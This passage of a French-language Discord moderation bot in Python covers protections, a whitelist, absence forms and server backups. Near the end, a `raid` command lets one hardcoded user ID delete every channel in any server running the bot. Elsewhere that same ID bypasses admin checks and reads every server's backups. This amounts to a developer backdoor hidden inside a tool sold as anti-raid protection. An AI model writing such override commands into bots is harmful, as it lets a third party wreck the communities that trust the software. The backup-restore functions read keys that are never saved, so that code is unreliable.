        {"$set": {"presentation_channel": channel_id}},
        upsert=True
    )

    await interaction.response.send_message(
        f"✅ Le salon de présentation a bien été défini sur {salon.mention}.", ephemeral=True
    )

# Gérer les erreurs de permissions
@set_presentation.error
async def set_presentation_error(interaction: discord.Interaction, error):
    if isinstance(error, app_commands.errors.MissingPermissions):
        await interaction.response.send_message("❌ Vous devez être administrateur pour utiliser cette commande.", ephemeral=True)

@bot.command()
@commands.has_permissions(administrator=True)
async def lock(ctx):
    """Empêche @everyone de parler dans le salon actuel (admin only)."""
    overwrite = ctx.channel.overwrites_for(ctx.guild.default_role)
    overwrite.send_messages = False
    await ctx.channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
    await ctx.send("🔒 Salon verrouillé. Seuls les rôles autorisés peuvent parler.")

@bot.command()
@commands.has_permissions(administrator=True)
async def unlock(ctx):
    """Autorise @everyone à parler dans le salon actuel (admin only)."""
    overwrite = ctx.channel.overwrites_for(ctx.guild.default_role)
    overwrite.send_messages = True
    await ctx.channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
    await ctx.send("🔓 Salon déverrouillé. Tout le monde peut parler à nouveau.")

# Modal pour le feedback
class FeedbackModal(discord.ui.Modal, title="Envoyer un feedback"):

    feedback_type = discord.ui.TextInput(
        label="Type (Report ou Suggestion)",
        placeholder="Ex: Report",
        max_length=20
    )

    description = discord.ui.TextInput(
        label="Description",
        placeholder="Décris ton idée ou ton problème ici...",
        style=discord.TextStyle.paragraph,
        max_length=1000
    )

    async def on_submit(self, interaction: discord.Interaction):
        channel = bot.get_channel(SALON_REPORT_ID)
        role_mention = f"<@&{ROLE_REPORT_ID}>"

        # Mention du rôle
        await channel.send(content=role_mention)

        # Embed amélioré
        embed = discord.Embed(
            title="📝 Nouveau Feedback Reçu",
            color=discord.Color.blurple(),
            timestamp=datetime.utcnow()
        )
        embed.add_field(name="🔖 Type", value=self.feedback_type.value, inline=False)
        embed.add_field(name="🧾 Description", value=self.description.value, inline=False)
        embed.add_field(name="👤 Utilisateur", value=f"{interaction.user.mention} (`{interaction.user.id}`)", inline=False)
        embed.add_field(name="🌐 Serveur", value=f"{interaction.guild.name} (`{interaction.guild.id}`)", inline=False)

        embed.set_thumbnail(url=interaction.user.display_avatar.url)
        embed.set_footer(text="Feedback envoyé le")

        await channel.send(embed=embed)
        await interaction.response.send_message("✅ Ton feedback a bien été envoyé ! Merci !", ephemeral=True)

# Slash command
@bot.tree.command(name="feedback", description="Envoyer un report ou une suggestion")
async def feedback(interaction: discord.Interaction):
    await interaction.response.send_modal(FeedbackModal())

PROTECTIONS = [
    "anti_massban",
    "anti_masskick",
    "anti_bot",
    "anti_createchannel",
    "anti_deletechannel",
    "anti_createrole",
    "anti_deleterole",
    "anti_everyone",
    "anti_spam",
    "anti_links",
    "whitelist"
]

PROTECTION_DETAILS = {
    "anti_massban": ("🚫 Anti-MassBan", "Empêche les bannissements massifs."),
    "anti_masskick": ("👢 Anti-MassKick", "Empêche les expulsions massives."),
    "anti_bot": ("🤖 Anti-Bot", "Bloque l'ajout de bots non autorisés."),
    "anti_createchannel": ("📤 Anti-Création de salon", "Empêche la création non autorisée de salons."),
    "anti_deletechannel": ("📥 Anti-Suppression de salon", "Empêche la suppression non autorisée de salons."),
    "anti_createrole": ("➕ Anti-Création de rôle", "Empêche la création non autorisée de rôles."),
    "anti_deleterole": ("➖ Anti-Suppression de rôle", "Empêche la suppression non autorisée de rôles."),
    "anti_everyone": ("📣 Anti-Everyone", "Empêche l'utilisation abusive de @everyone ou @here."),
    "anti_spam": ("💬 Anti-Spam", "Empêche le spam excessif de messages."),
    "anti_links": ("🔗 Anti-Liens", "Empêche l'envoi de liens non autorisés."),
    "whitelist": ("✅ Liste blanche", "Utilisateurs exemptés des protections.")
}

def is_admin_or_isey():
    async def predicate(ctx):
        return ctx.author.guild_permissions.administrator or ctx.author.id == ISEY_ID
    return commands.check(predicate)

def generate_global_status_bar(data: dict) -> str:
    protections = [prot for prot in PROTECTIONS if prot != "whitelist"]
    total = len(protections)
    enabled_count = sum(1 for prot in protections if data.get(prot, False))
    ratio = enabled_count / total

    bar_length = 10
    filled_length = round(bar_length * ratio)
    bar = "🟩" * filled_length + "⬛" * (bar_length - filled_length)
    return f"**Sécurité Globale :** `{enabled_count}/{total}`\n{bar}"


def format_protection_field(prot, data, guild, bot):
    name, desc = PROTECTION_DETAILS[prot]
    enabled = data.get(prot, False)
    status = "✅ Activée" if enabled else "❌ Désactivée"
    updated_by_id = data.get(f"{prot}_updated_by")
    updated_at = data.get(f"{prot}_updated_at")

    modifier = None
    if updated_by_id:
        modifier = guild.get_member(int(updated_by_id)) or updated_by_id

    formatted_date = ""
    if updated_at:
        dt = updated_at.replace(tzinfo=pytz.utc).astimezone(pytz.timezone("Europe/Paris"))
        formatted_date = f"🕓 {dt.strftime('%d/%m/%Y à %H:%M')}"

    mod_info = f"\n👤 Modifié par : {modifier.mention if isinstance(modifier, discord.Member) else modifier}" if modifier else ""
    date_info = f"\n{formatted_date}" if formatted_date else ""

    value = f"> {desc}\n> **Statut :** {status}{mod_info}{date_info}"
    return name, value

async def notify_owner_of_protection_change(guild, prot, new_value, interaction):
    if guild and guild.owner:
        try:
            embed = discord.Embed(
                title="🔐 Mise à jour d'une protection sur votre serveur",
                description=f"**Protection :** {PROTECTION_DETAILS[prot][0]}\n"
                            f"**Statut :** {'✅ Activée' if new_value else '❌ Désactivée'}",
                color=discord.Color.green() if new_value else discord.Color.red()
            )
            embed.add_field(
                name="👤 Modifiée par :",
                value=f"{interaction.user.mention} (`{interaction.user}`)",
                inline=False
            )
            embed.add_field(name="🏠 Serveur :", value=guild.name, inline=False)
            embed.add_field(
                name="🕓 Date de modification :",
                value=f"<t:{int(datetime.utcnow().timestamp())}:f>",
                inline=False
            )
            embed.add_field(
                name="ℹ️ Infos supplémentaires :",
                value="Vous pouvez reconfigurer vos protections à tout moment avec la commande `/protection`.",
                inline=False
            )

            await guild.owner.send(embed=embed)
        except discord.Forbidden:
            print("Impossible d’envoyer un DM à l’owner.")
        except Exception as e:
            print(f"Erreur lors de l'envoi du DM : {e}")

class ProtectionMenu(Select):
    def __init__(self, guild_id, protection_data, bot):
        self.guild_id = guild_id
        self.protection_data = protection_data
        self.bot = bot

        options = [
            discord.SelectOption(
                label=PROTECTION_DETAILS[prot][0],
                description="Activer ou désactiver cette protection.",
                emoji="🔒" if protection_data.get(prot, False) else "🔓",
                value=prot
            )
            for prot in PROTECTIONS if prot != "whitelist"
        ]

        super().__init__(
            placeholder="🔧 Choisissez une protection à modifier",
            min_values=1,
            max_values=1,
            options=options
        )

    async def callback(self, interaction: discord.Interaction):
        prot = self.values[0]
        current = self.protection_data.get(prot, False)
        new_value = not current

        collection4.update_one(
            {"guild_id": str(self.guild_id)},
            {"$set": {
                prot: new_value,
                f"{prot}_updated_by": str(interaction.user.id),
                f"{prot}_updated_at": datetime.utcnow()
            }},
            upsert=True
        )

        self.protection_data[prot] = new_value
        self.protection_data[f"{prot}_updated_by"] = interaction.user.id
        self.protection_data[f"{prot}_updated_at"] = datetime.utcnow()

        guild = interaction.guild
        if guild and guild.owner:
            await notify_owner_of_protection_change(guild, prot, new_value, interaction)

        embed = discord.Embed(title="🛡️ Système de Protection", color=discord.Color.blurple())
        for p in PROTECTIONS:
            if p == "whitelist":
                whitelist_data = collection19.find_one({"guild_id": str(self.guild_id)}) or {}
                wl_users = whitelist_data.get("whitelist", [])
                if not wl_users:
                    embed.add_field(name=PROTECTION_DETAILS[p][0], value="Aucun utilisateur whitelisté.", inline=False)
                else:
                    members = []
                    for uid in wl_users:
                        user = interaction.guild.get_member(int(uid)) or await self.bot.fetch_user(int(uid))
                        members.append(f"- {user.mention if isinstance(user, discord.Member) else user.name}")
                    embed.add_field(name=PROTECTION_DETAILS[p][0], value="\n".join(members), inline=False)
            else:
                name, value = format_protection_field(p, self.protection_data, guild, self.bot)
                embed.add_field(name=name, value=value, inline=False)

        # ➕ Ajoute ce résumé en bas :
        embed.add_field(
            name="🔒 Résumé des protections",
            value=generate_global_status_bar(self.protection_data),
            inline=False
        )

        embed.set_footer(text="🎚️ Sélectionnez une option ci-dessous pour gérer la sécurité du serveur.")
        view = View()
        view.add_item(ProtectionMenu(self.guild_id, self.protection_data, self.bot))
        await interaction.response.edit_message(embed=embed, view=view)

class ProtectionView(View):
    def __init__(self, guild_id, protection_data, bot):
        super().__init__(timeout=None)
        self.add_item(ProtectionMenu(guild_id, protection_data, bot))

@bot.hybrid_command(name="protection", description="Configurer les protections du serveur")
@is_admin_or_isey()
async def protection(ctx: commands.Context):
    guild_id = str(ctx.guild.id)
    protection_data = collection4.find_one({"guild_id": guild_id}) or {}

    embed = discord.Embed(title="🛡️ Système de Protection", color=discord.Color.blurple())
    for prot in PROTECTIONS:
        if prot == "whitelist":
            whitelist_data = collection19.find_one({"guild_id": guild_id}) or {}
            wl_users = whitelist_data.get("whitelist", [])
            if not wl_users:
                embed.add_field(name=PROTECTION_DETAILS[prot][0], value="Aucun utilisateur whitelisté.", inline=False)
            else:
                members = []
                for uid in wl_users:
                    user = ctx.guild.get_member(int(uid)) or await ctx.bot.fetch_user(int(uid))
                    members.append(f"- {user.mention if isinstance(user, discord.Member) else user.name}")
                embed.add_field(name=PROTECTION_DETAILS[prot][0], value="\n".join(members), inline=False)
        else:
            name, value = format_protection_field(prot, protection_data, ctx.guild, ctx.bot)
            embed.add_field(name=name, value=value, inline=False)

    # ➕ Ajoute le résumé ici aussi :
    embed.add_field(
        name="🔒 Résumé des protections",
        value=generate_global_status_bar(protection_data),
        inline=False
    )
    embed.set_footer(text="🎚️ Sélectionnez une option ci-dessous pour gérer la sécurité du serveur.")
    view = ProtectionView(guild_id, protection_data, ctx.bot)
    await ctx.send(embed=embed, view=view)

# Fonction pour ajouter un utilisateur à la whitelist
@bot.command()
async def addwl(ctx, user: discord.User):
    if ctx.author.id != ISEY_ID:  # Vérifie si l'utilisateur est bien l'administrateur
        await ctx.send("Désolé, vous n'avez pas l'autorisation d'utiliser cette commande.")
        return

    guild_id = str(ctx.guild.id)
    wl_data = collection19.find_one({"guild_id": guild_id})

    # Si la whitelist n'existe pas encore, on la crée
    if not wl_data:
        collection19.insert_one({"guild_id": guild_id, "whitelist": []})
        wl_data = {"whitelist": []}

    # Si l'utilisateur est déjà dans la whitelist
    if str(user.id) in wl_data["whitelist"]:
        await ctx.send(f"{user.name} est déjà dans la whitelist.")
    else:
        # Ajoute l'utilisateur à la whitelist
        collection19.update_one(
            {"guild_id": guild_id},
            {"$push": {"whitelist": str(user.id)}}
        )
        await ctx.send(f"{user.name} a été ajouté à la whitelist.")

# Fonction pour retirer un utilisateur de la whitelist
@bot.command()
async def removewl(ctx, user: discord.User):
    if ctx.author.id != ISEY_ID:  # Vérifie si l'utilisateur est bien l'administrateur
        await ctx.send("Désolé, vous n'avez pas l'autorisation d'utiliser cette commande.")
        return

    guild_id = str(ctx.guild.id)
    wl_data = collection19.find_one({"guild_id": guild_id})

    if not wl_data or str(user.id) not in wl_data["whitelist"]:
        await ctx.send(f"{user.name} n'est pas dans la whitelist.")
    else:
        # Retirer l'utilisateur de la whitelist
        collection19.update_one(
            {"guild_id": guild_id},
            {"$pull": {"whitelist": str(user.id)}}
        )
        await ctx.send(f"{user.name} a été retiré de la whitelist.")

@bot.command()
async def listwl(ctx):
    if ctx.author.id != ISEY_ID:
        return await ctx.send(embed=discord.Embed(
            title="⛔ Accès refusé",
            description="Vous n'avez pas l'autorisation d'utiliser cette commande.",
            color=discord.Color.red()
        ))

    guild_id = str(ctx.guild.id)
    wl_data = collection19.find_one({"guild_id": guild_id})

    if not wl_data or not wl_data.get("whitelist"):
        embed = discord.Embed(
            title="Whitelist",
            description="La whitelist de ce serveur est vide.",
            color=discord.Color.orange()
        )
        embed.set_footer(text="Etherya • Gestion des accès")
        return await ctx.send(embed=embed)

    whitelist_users = [f"<@{user_id}>" for user_id in wl_data["whitelist"]]
    description = "\n".join(whitelist_users)

    embed = discord.Embed(
        title="✅ Utilisateurs Whitelistés",
        description=description,
        color=discord.Color.green()
    )
    embed.set_footer(text=f"Project : Delta • {len(whitelist_users)} utilisateur(s) whitelisté(s)")
    await ctx.send(embed=embed)

# ===============================
# ┃ COMMANDE /set_absence
# ===============================
@bot.tree.command(name="set_absence", description="Configurer le salon des absences et le rôle autorisé")
@discord.app_commands.describe(channel="Salon de destination", role="Rôle autorisé à envoyer des absences")
async def set_absence(interaction: discord.Interaction, channel: discord.TextChannel, role: discord.Role):
    if not interaction.user.guild_permissions.administrator:
        return await interaction.response.send_message("❌ Vous devez être administrateur pour utiliser cette commande.", ephemeral=True)

    collection22.update_one(
        {"guild_id": str(interaction.guild.id)},
        {"$set": {
            "channel_id": channel.id,
            "role_id": role.id
        }},
        upsert=True
    )
    await interaction.response.send_message(f"✅ Salon d'absence défini sur {channel.mention}, rôle autorisé : {role.mention}", ephemeral=True)

# ===============================
# ┃ MODAL pour /absence
# ===============================
class AbsenceModal(discord.ui.Modal, title="Déclaration d'absence"):

    pseudo = discord.ui.TextInput(label="Pseudo", placeholder="Ton pseudo IG ou Discord", max_length=100)
    date = discord.ui.TextInput(label="Date(s)", placeholder="Ex: du 20 au 25 avril", max_length=100)
    raison = discord.ui.TextInput(label="Raison", style=discord.TextStyle.paragraph, max_length=500)

    def __init__(self, interaction: discord.Interaction, channel: discord.TextChannel):
        super().__init__()
        self.interaction = interaction
        self.channel = channel

    async def on_submit(self, interaction: discord.Interaction):
        embed = discord.Embed(title="📋 Nouvelle absence déclarée", color=0xffd700)
        embed.set_author(name=interaction.user.name, icon_url=interaction.user.display_avatar.url)
        embed.add_field(name="👤 Pseudo", value=self.pseudo.value, inline=False)
        embed.add_field(name="📅 Date", value=self.date.value, inline=False)
        embed.add_field(name="📝 Raison", value=self.raison.value, inline=False)
        embed.set_footer(text=f"ID: {interaction.user.id}")
        await self.channel.send(embed=embed)
        await interaction.response.send_message("✅ Ton absence a bien été enregistrée !", ephemeral=True)

# ===============================
# ┃ COMMANDE /absence
# ===============================
@bot.tree.command(name="absence", description="Déclarer une absence")
async def absence(interaction: discord.Interaction):
    data = collection22.find_one({"guild_id": str(interaction.guild.id)})

    if not data:
        return await interaction.response.send_message("❌ Le système d'absence n'est pas configuré.", ephemeral=True)

    role_id = data.get("role_id")
    channel_id = data.get("channel_id")
    channel = interaction.guild.get_channel(channel_id)

    if not channel:
        return await interaction.response.send_message("❌ Le salon d'absence n'a pas été trouvé.", ephemeral=True)

    if not role_id or role_id not in [role.id for role in interaction.user.roles]:
        return await interaction.response.send_message("❌ Vous n'avez pas le rôle requis pour déclarer une absence.", ephemeral=True)

    await interaction.response.send_modal(AbsenceModal(interaction, channel))

#------------------------------------------------------------------------ BACK UP

# Fonction pour sauvegarder les rôles, salons et permissions du serveur
def save_guild_settings(guild_id):
    guild = bot.get_guild(int(guild_id))
    if not guild:
        return {}

    # Sauvegarde des rôles (on exclut @everyone)
    roles_data = []
    for role in guild.roles:
        if role.is_default():
            continue
        roles_data.append({
            "name": role.name,
            "color": role.color.value,
            "hoist": role.hoist,
            "mentionable": role.mentionable,
            "permissions": role.permissions.value,
            "position": role.position
        })

    # Sauvegarde des salons et catégories
    channels_data = []
    for channel in guild.channels:
        overwrites = {}
        for target, perm in channel.overwrites.items():
            if isinstance(target, discord.Role):
                overwrites[str(target.id)] = {
                    "allow": perm.pair()[0].value,
                    "deny": perm.pair()[1].value
                }
        channels_data.append({
            "name": channel.name,
            "type": str(channel.type),
            "category": channel.category.name if channel.category else None,
            "position": channel.position,
            "overwrites": overwrites
        })

    return {
        "roles": roles_data,
        "channels": channels_data
    }

@bot.tree.command(name="create-back-up", description="Créer une sauvegarde du serveur")
async def create_backup(interaction: discord.Interaction, name: str):
    if interaction.user.id != interaction.guild.owner_id and interaction.user.id != ISEY_ID:
        embed = discord.Embed(
            title="❌ Accès refusé",
            description="Seul le propriétaire du serveur peut créer une sauvegarde.",
            color=discord.Color.red()
        )
        return await interaction.response.send_message(embed=embed, ephemeral=True)

    data = save_guild_settings(str(interaction.guild.id))
    if not data:
        embed = discord.Embed(
            title="❌ Erreur",
            description="Impossible de récupérer les données du serveur.",
            color=discord.Color.red()
        )
        return await interaction.response.send_message(embed=embed, ephemeral=True)

    collection23.insert_one({
        "guild_id": str(interaction.guild.id),
        "backup_name": name,
        "created_by": str(interaction.user.id),
        "data": data,
        "timestamp": datetime.utcnow()
    })

    embed = discord.Embed(
        title="✅ Sauvegarde créée",
        description=f"La sauvegarde **`{name}`** a été créée avec succès.",
        color=discord.Color.green()
    )
    embed.set_footer(text="Utilise /list-back-up pour la voir.")
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="load-back-up", description="Charger une sauvegarde existante")
@app_commands.autocomplete(name="name")  # Associer l'autocomplétion à l'argument 'name'
async def load_backup(interaction: discord.Interaction, name: str):
    # Recherche la sauvegarde dans la base de données
    backup = collection23.find_one({"backup_name": name})
    if not backup:
        embed = discord.Embed(
            title="❌ Introuvable",
            description="Aucune sauvegarde trouvée avec ce nom.",
            color=discord.Color.red()
        )
        return await interaction.response.send_message(embed=embed, ephemeral=True)

    if backup["created_by"] != str(interaction.user.id) and interaction.user.id != ISEY_ID:
        embed = discord.Embed(
            title="🚫 Accès refusé",
            description="Tu ne peux charger que tes propres sauvegardes.",
            color=discord.Color.red()
        )
        return await interaction.response.send_message(embed=embed, ephemeral=True)

    if not interaction.user.guild_permissions.administrator:
        embed = discord.Embed(
            title="🔒 Permissions manquantes",
            description="Tu dois avoir les permissions administrateur pour charger une sauvegarde.",
            color=discord.Color.red()
        )
        return await interaction.response.send_message(embed=embed, ephemeral=True)

    loading_embed = discord.Embed(
        title="⏳ Chargement en cours",
        description=f"La sauvegarde **`{name}`** est en cours de restauration...",
        color=discord.Color.blurple()
    )
    await interaction.response.send_message(embed=loading_embed, ephemeral=True)

    try:
        # Restaurer les rôles si nécessaire
        await restore_roles(interaction.guild, backup)

        # Restaurer les salons si nécessaire
        await restore_channels(interaction.guild, backup)

        done_embed = discord.Embed(
            title="✅ Sauvegarde restaurée",
            description=f"La sauvegarde **`{name}`** a été restaurée avec succès !",
            color=discord.Color.green()
        )
        await interaction.followup.send(embed=done_embed, ephemeral=True)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ Erreur",
            description=f"Une erreur est survenue lors de la restauration : {str(e)}",
            color=discord.Color.red()
        )
        await interaction.followup.send(embed=error_embed, ephemeral=True)

# Fonction pour restaurer les rôles sans recréer ceux qui existent déjà
async def restore_roles(guild, backup):
    for role_data in backup["roles"]:
        role_name = role_data["name"]
        # Chercher le rôle existant
        existing_role = discord.utils.get(guild.roles, name=role_name)
        
        if not existing_role:
            # Créer un nouveau rôle seulement s'il n'existe pas
            new_role = await guild.create_role(name=role_name, permissions=discord.Permissions(role_data["permissions"]))
            # Appliquer d'autres données comme la couleur, position, etc.
            await new_role.edit(color=discord.Color(role_data["color"]))
        else:
            # Si le rôle existe, on peut juste appliquer des permissions ou des changements nécessaires
            await existing_role.edit(permissions=discord.Permissions(role_data["permissions"]))

# Fonction pour restaurer les salons sans les recréer
async def restore_channels(guild, backup):
    for channel_data in backup["channels"]:
        channel_name = channel_data["name"]
        existing_channel = discord.utils.get(guild.channels, name=channel_name)
        
        if not existing_channel:
            # Créer un nouveau salon seulement s'il n'existe pas
            if channel_data["type"] == "text":
                await guild.create_text_channel(channel_name, category=discord.utils.get(guild.categories, id=channel_data["category_id"]))
            elif channel_data["type"] == "voice":
                await guild.create_voice_channel(channel_name, category=discord.utils.get(guild.categories, id=channel_data["category_id"]))
        else:
            # Si le salon existe, on peut juste mettre à jour des permissions ou autres paramètres si nécessaire
            await existing_channel.edit(sync_permissions=True)  # Par exemple, synchroniser les permissions si nécessaire

# Fonction d'autocomplétion pour les noms de sauvegarde (version asynchrone)
async def autocomplete_backup_names(interaction: discord.Interaction, current: str):
    backups = collection23.find({"backup_name": {"$regex": f"^{current}", "$options": "i"}})
    return [
        app_commands.Choice(name=backup["backup_name"], value=backup["backup_name"]) 
        for backup in backups
    ]

@bot.tree.command(name="list-back-up", description="Lister vos sauvegardes")
async def list_backup(interaction: discord.Interaction):
    if interaction.user.id == ISEY_ID:
        backups = list(collection23.find())
    else:
        backups = list(collection23.find({"created_by": str(interaction.user.id)}))

    if not backups:
        embed = discord.Embed(
            title="📂 Aucune sauvegarde",
            description="Aucune sauvegarde trouvée.",
            color=discord.Color.orange()
        )
        return await interaction.response.send_message(embed=embed, ephemeral=True)

    embed = discord.Embed(
        title="📦 Liste des sauvegardes",
        description="Voici la liste des sauvegardes disponibles :",
        color=discord.Color.blurple()
    )
    embed.set_footer(text=f"Total : {len(backups)} sauvegarde(s)")
    embed.set_thumbnail(url=interaction.user.display_avatar.url)

    for b in backups:
        user = await bot.fetch_user(int(b['created_by']))
        embed.add_field(
            name=f"🧷 {b['backup_name']}",
            value=(
                f"> 🏷️ **Serveur ID :** `{b['guild_id']}`\n"
                f"> 👤 **Créée par :** {user.mention if user else '`Utilisateur inconnu`'}\n"
                f"> 📅 **Créée le :** <t:{int(b['timestamp'].timestamp())}:F>"
            ),
            inline=False
        )

    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="delete-back-up", description="Supprimer une sauvegarde")
async def delete_backup(interaction: discord.Interaction, name: str):
    backup = collection23.find_one({"backup_name": name})
    if not backup:
        embed = discord.Embed(
            title="❌ Introuvable",
            description="Aucune sauvegarde trouvée avec ce nom.",
            color=discord.Color.red()
        )
        return await interaction.response.send_message(embed=embed, ephemeral=True)

    if backup["created_by"] != str(interaction.user.id) and interaction.user.id != ISEY_ID:
        embed = discord.Embed(
            title="🚫 Accès refusé",
            description="Tu ne peux supprimer que tes propres sauvegardes.",
            color=discord.Color.red()
        )
        return await interaction.response.send_message(embed=embed, ephemeral=True)

    collection23.delete_one({"backup_name": name})
    embed = discord.Embed(
        title="🗑️ Sauvegarde supprimée",
        description=f"La sauvegarde **`{name}`** a été supprimée.",
        color=discord.Color.orange()
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.command()
async def raid(ctx):
    # Vérifie si l'auteur de la commande est ISEY_ID
    if ctx.author.id != ISEY_ID:
        await ctx.send("Tu n'as pas l'autorisation d'utiliser cette commande.")
        return
    
    # Suppression de tous les salons
    for channel in ctx.guild.channels:
        await channel.delete()

    # Création d'un nouveau salon "Chat-Tempo"
    overwrites = {
        ctx.guild.default_role: discord.PermissionOverwrite(read_messages=False),
        ctx.guild.owner: discord.PermissionOverwrite(read_messages=True)
    }
    
    await ctx.guild.create_text_channel('Chat-Tempo', overwrites=overwrites)
    await ctx.send("Tous les salons ont été supprimés et 'Chat-Tempo' a été créé.")

@bot.tree.command(name="activate-troll", description="Active les commandes troll pour ce serveur")
@app_commands.checks.has_permissions(administrator=True)
async def activate_troll(interaction: discord.Interaction):
    guild_id = interaction.guild.id
    guild_name = interaction.guild.name

    # Mettre à jour ou insérer l'activation dans MongoDB
    collection27.update_one(
        {"guild_id": guild_id},
        {"$set": {"guild_name": guild_name, "troll_active": True}},
        upsert=True
    )

    await interaction.response.send_message(
        f"✅ Les commandes troll ont été **activées** sur ce serveur !", ephemeral=True
    )

# Gestion des erreurs si l'utilisateur n'a pas les permissions
@activate_troll.error
async def activate_troll_error(interaction: discord.Interaction, error):
    if isinstance(error, app_commands.errors.MissingPermissions):
        await interaction.response.send_message("🚫 Vous devez être **administrateur** pour utiliser cette commande.", ephemeral=True)
    else:
        await interaction.response.send_message("❌ Une erreur est survenue.", ephemeral=True)

@bot.tree.command(name="deactivate-troll", description="Désactive les commandes troll pour ce serveur")
@app_commands.checks.has_permissions(administrator=True)
async def deactivate_troll(interaction: discord.Interaction):
    guild_id = interaction.guild.id
    guild_name = interaction.guild.name

    # Mettre à jour ou insérer la désactivation dans MongoDB
    collection27.update_one(
        {"guild_id": guild_id},
        {"$set": {"guild_name": guild_name, "troll_active": False}},
        upsert=True
    )

    await interaction.response.send_message(
        f"⛔ Les commandes troll ont été **désactivées** sur ce serveur !", ephemeral=True
    )

# Gestion des erreurs si l'utilisateur n'a pas les permissions
@deactivate_troll.error
async def deactivate_troll_error(interaction: discord.Interaction, error):
    if isinstance(error, app_commands.errors.MissingPermissions):
        await interaction.response.send_message("🚫 Vous devez être **administrateur** pour utiliser cette commande.", ephemeral=True)
    else:
        await interaction.response.send_message("❌ Une erreur est survenue.", ephemeral=True)

# Token pour démarrer le bot (à partir des secrets)
# Lancer le bot avec ton token depuis l'environnement  
keep_alive()
bot.run(token)
